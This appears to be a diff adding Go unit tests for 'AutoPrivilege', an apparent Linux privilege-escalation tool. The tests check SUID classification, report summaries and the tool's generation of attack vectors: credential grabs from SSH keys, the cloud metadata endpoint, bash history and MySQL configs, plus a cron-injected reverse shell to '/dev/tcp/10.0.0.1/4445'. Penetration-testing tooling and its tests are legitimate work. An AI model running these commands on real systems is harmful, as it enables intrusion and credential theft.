@@ -1,6 +1,7 @@
 package main
 
 import (
+	"io"
 	"os"
 	"path/filepath"
 	"strings"
@@ -361,6 +362,166 @@ func TestJSONReportShape(t *testing.T) {
 	}
 	if rep.Host == "" || rep.User == "" {
 		t.Error("host/user must be populated")
+	}
+}
+
+func TestJSONSummary(t *testing.T) {
+	p := &AutoPrivilege{
+		Started: time.Now(),
+		Findings: []Finding{
+			{Source: "SUID", Risk: RiskHigh, Exploitable: true},
+			{Source: "CAPS", Risk: RiskMedium, Exploitable: false},
+			{Source: "KERNEL", Risk: RiskHigh, Exploitable: true},
+		},
+		Vectors: []Vector{
+			{Name: "auto-1", Exploit: func() *ExploitResult { return nil }},
+			{Name: "manual-1"},
+			{Name: "manual-2"},
+		},
+	}
+	s := buildSummary(p)
+	if s.Findings != 3 || s.Exploitable != 2 {
+		t.Errorf("findings/exploitable = %d/%d, want 3/2", s.Findings, s.Exploitable)
+	}
+	if s.Vectors != 3 || s.Auto != 1 || s.Manual != 2 {
+		t.Errorf("vectors/auto/manual = %d/%d/%d, want 3/1/2", s.Vectors, s.Auto, s.Manual)
+	}
+	if s.Risks["HIGH"] != 2 || s.Risks["MEDIUM"] != 1 {
+		t.Errorf("risk buckets = %v, want HIGH:2 MEDIUM:1", s.Risks)
+	}
+	if _, ok := s.Risks["SAFE"]; ok {
+		t.Error("zero-count risk buckets must be omitted")
+	}
+	if s.Risks == nil {
+		t.Error("Risks must never be nil (must render as {} not null)")
+	}
+	// The summary must also ride along inside the full report.
+	rep := buildReport(p)
+	if rep.Summary.Vectors != 3 || rep.Summary.Exploitable != 2 {
+		t.Errorf("report.summary not wired: %+v", rep.Summary)
+	}
+}
+
+func TestEnumerateCredentialVectors(t *testing.T) {
+	// Every exploitable CRED finding must produce exactly one manual vector,
+	// so the plan and report never drop a finding.
+	cases := []Finding{
+		{Source: "CRED", Target: "/home/u/.ssh/id_rsa", Description: "SSH private key found", Exploitable: true},
+		{Source: "CRED", Target: "http://169.254.169.254/latest/meta-data/", Description: "Cloud metadata endpoint accessible", Exploitable: true},
+		{Source: "CRED", Target: "/root/.bash_history", Description: "History file with potential secrets: password", Exploitable: true},
+		{Source: "CRED", Target: "/etc/mysql/my.cnf", Description: "MySQL config with credentials", Exploitable: true},
+	}
+	for _, f := range cases {
+		p := &AutoPrivilege{}
+		enumerateCredential(p, f)
+		if len(p.Vectors) != 1 {
+			t.Errorf("finding %s produced %d vectors, want 1", f.Target, len(p.Vectors))
+			continue
+		}
+		v := p.Vectors[0]
+		if v.Exploit != nil {
+			t.Errorf("cred vector %s must be manual", v.Name)
+		}
+		if v.Meta["manual"] != "true" {
+			t.Errorf("cred vector %s missing manual meta", v.Name)
+		}
+		if v.Command == "" {
+			t.Errorf("cred vector %s has no command", v.Name)
+		}
+	}
+	// Type tagging lets scripts tell the cred techniques apart.
+	p := &AutoPrivilege{}
+	enumerateCredential(p, cases[1])
+	if p.Vectors[0].Meta["type"] != "cloud-metadata" {
+		t.Errorf("cloud metadata vector type = %s", p.Vectors[0].Meta["type"])
+	}
+}
+
+func TestClassifySUID(t *testing.T) {
+	// Root-owned SUID bins with a known technique stay exploitable.
+	if risk, ok := classifySUID("python3", 0); !ok || risk != RiskHigh {
+		t.Errorf("python3 uid0 = %s/%v, want HIGH/true", risk, ok)
+	}
+	if _, ok := classifySUID("find", 0); !ok {
+		t.Error("find uid0 must be exploitable")
+	}
+	// Root-owned SUID without a known technique: intel only.
+	if _, ok := classifySUID("chsh", 0); ok {
+		t.Error("chsh uid0 has no technique, must not be exploitable")
+	}
+	// Non-root-owned SUID: NEVER a root vector, technique or not.
+	if _, ok := classifySUID("python3", 1000); ok {
+		t.Error("SUID python3 owned by uid 1000 must not be exploitable")
+	}
+	if _, ok := classifySUID("bash", 1000); ok {
+		t.Error("SUID bash owned by uid 1000 must not be exploitable")
+	}
+}
+
+// captureStdout grabs whatever fn prints to os.Stdout so quiet-mode leaks
+// are detectable.
+func captureStdout(t *testing.T, fn func()) string {
+	t.Helper()
+	orig := os.Stdout
+	r, w, err := os.Pipe()
+	if err != nil {
+		t.Fatal(err)
+	}
+	os.Stdout = w
+	fn()
+	_ = w.Close()
+	os.Stdout = orig
+	data, _ := io.ReadAll(r)
+	return string(data)
+}
+
+func TestPrintQuietRespected(t *testing.T) {
+	f := Finding{Source: "SUID", Target: "/usr/bin/python3", Description: "test", Risk: RiskHigh, Exploitable: true}
+
+	out := captureStdout(t, func() {
+		p := &AutoPrivilege{Opts: Options{Quiet: true}}
+		p.Print(f) // exploitable: the old code leaked it in quiet mode
+	})
+	if out != "" {
+		t.Errorf("--quiet must print nothing, got %q", out)
+	}
+
+	out = captureStdout(t, func() {
+		p := &AutoPrivilege{}
+		p.Print(f)
+	})
+	if !strings.Contains(out, "SUID") {
+		t.Errorf("non-quiet Print must still print, got %q", out)
+	}
+}
+
+func TestCronVectorCommandQuoting(t *testing.T) {
+	p := &AutoPrivilege{Opts: Options{LHost: "10.0.0.1", LPort: "4445"}}
+	enumerateCRON(p, Finding{Source: "CRON", Target: "/etc/cron.d/backup", Exploitable: true})
+	if len(p.Vectors) != 1 {
+		t.Fatalf("expected 1 vector, got %d", len(p.Vectors))
+	}
+	cmd := p.Vectors[0].Command
+	// The payload embeds single quotes (bash -c '...'), so the displayed
+	// command must be a quoted heredoc, not an echo with broken quoting.
+	if !strings.Contains(cmd, "<<'AUTOPRIV_EOF'") {
+		t.Errorf("cron command must use a quoted heredoc: %q", cmd)
+	}
+	if !strings.Contains(cmd, "exec 5<>/dev/tcp/10.0.0.1/4445") {
+		t.Errorf("cron command must embed the configured listener: %q", cmd)
+	}
+	if strings.Contains(cmd, "echo '") {
+		t.Errorf("cron command must not re-introduce the broken echo form: %q", cmd)
+	}
+	// Round-trip: the displayed command must survive /bin/sh verbatim.
+	// Target a temp file so the check never touches the real cron dirs;
+	// `cat` goes on its own line because a heredoc terminator must be the
+	// whole line.
+	tmp := filepath.Join(t.TempDir(), "backup")
+	real := strings.Replace(cmd, "/etc/cron.d/backup", tmp, 1)
+	res := execShell(real+"\ncat "+tmp, Options{}, 5*time.Second)
+	if !res.Success || !strings.Contains(res.Output, "dev/tcp/10.0.0.1/4445") {
+		t.Errorf("displayed cron command must execute cleanly (success=%v, output=%q)", res.Success, res.Output)
 	}
 }
 
